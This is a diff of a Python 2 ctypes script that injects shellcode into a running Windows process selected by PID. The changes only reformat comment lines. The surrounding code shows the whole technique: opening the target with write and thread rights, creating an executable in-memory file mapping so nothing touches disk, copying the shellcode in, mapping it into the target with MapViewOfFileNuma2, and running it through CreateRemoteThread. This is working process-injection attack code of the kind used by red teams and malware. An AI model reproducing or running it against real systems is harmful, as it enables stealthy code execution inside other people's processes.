@@ -65,8 +65,8 @@ pid = sys.argv[1]
 kernel32.OpenProcess.restype = HANDLE       # HANDLE OpenProcess(
 kernel32.OpenProcess.argtypes = [DWORD,     #   DWORD dwDesiredAccess,
                                  c_bool,    #   BOOL  bInheritHandle,
-                                 DWORD]     #   DWORD dwProcessId
-                                            # );
+                                 DWORD]     #   DWORD dwProcessId );
+
 # Get a handle to the target process
 hProc = kernel32.OpenProcess((PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ), False, DWORD(int(pid)))
 if not hProc:
@@ -80,8 +80,8 @@ kernel32.CreateFileMappingA.argtypes = [HANDLE,     #   HANDLE                hF
                                         DWORD,      #   DWORD                 flProtect,
                                         DWORD,      #   DWORD                 dwMaximumSizeHigh,
                                         DWORD,      #   DWORD                 dwMaximumSizeLow,
-                                        LPCSTR]     #   LPCSTR                lpName
-                                                    # );
+                                        LPCSTR]     #   LPCSTR                lpName );
+
 # Create a file mapping object so the shellcode doesn't have to be put on disk. This is achieved by using INVALID_HANDLE_VALUE as the first parameter.
 hFileMap = kernel32.CreateFileMappingA(INVALID_HANDLE_VALUE, None, PAGE_EXECUTE_READWRITE, 0, len(shellcode), None)
 if not hFileMap:
@@ -95,8 +95,8 @@ kernel32.MapViewOfFile.argtypes = [HANDLE,      #   HANDLE hFileMappingObject,
                                    DWORD,       #   DWORD  dwDesiredAccess,
                                    DWORD,       #   DWORD  dwFileOffsetHigh,
                                    DWORD,       #   DWORD  dwFileOffsetLow,
-                                   c_size_t]    #   SIZE_T dwNumberOfBytesToMap
-                                                # );
+                                   c_size_t]    #   SIZE_T dwNumberOfBytesToMap );
+
 # Create a local view with write permissions for copying shellcode into.
 lpMapAddress = kernel32.MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, len(shellcode))
 if not lpMapAddress:
@@ -107,8 +107,8 @@ if not lpMapAddress:
 cdll.msvcrt.memcpy.restype = c_void_p       # void *memcpy(
 cdll.msvcrt.memcpy.argtypes = [c_void_p,    #    void *dest,
                                c_wchar_p,   #    const void *src,
-                               c_int]       #    size_t count
-                                            # );
+                               c_int]       #    size_t count );
+
 # Place the shellcode into the mapping object.
 cdll.msvcrt.memcpy(lpMapAddress, shellcode, len(shellcode))
 print "[*] Written %s bytes to the global mapping object" % len(shellcode)
@@ -122,8 +122,8 @@ KernelBase.MapViewOfFileNuma2.argtypes = [HANDLE,           #   HANDLE  FileMapp
                                           c_size_t,         #   SIZE_T  ViewSize,
                                           c_ulong,          #   ULONG   AllocationType,
                                           c_ulong,          #   ULONG   PageProtection,
-                                          c_ulong]          #   ULONG   PreferredNode
-                                                            # );
+                                          c_ulong]          #   ULONG   PreferredNode );
+
 # Map in the memory we copied to the target process.
 lpMapAddressRemote = KernelBase.MapViewOfFileNuma2(hFileMap, hProc, 0, None, 0, 0, PAGE_EXECUTE_READ, NUMA_NO_PREFERRED_NODE)
 if not lpMapAddressRemote:
@@ -140,8 +140,8 @@ kernel32.CreateRemoteThread.argtypes = [HANDLE,                     #   HANDLE  
                                         LPTHREAD_START_ROUTINE,     #   LPTHREAD_START_ROUTINE lpStartAddress,
                                         LPVOID,                     #   LPVOID                 lpParameter,
                                         DWORD,                      #   DWORD                  dwCreationFlags,
-                                        LPDWORD]                    #   LPDWORD                lpThreadId
-                                                                    # );
+                                        LPDWORD]                    #   LPDWORD                lpThreadId );
+
 # Create a remote thread pointing to the starting address returned by MayViewOfFileNuma2.
 hRemoteThread = kernel32.CreateRemoteThread(hProc, None, 0, LPTHREAD_START_ROUTINE(lpMapAddressRemote), None, 0, None)
 if not hRemoteThread:
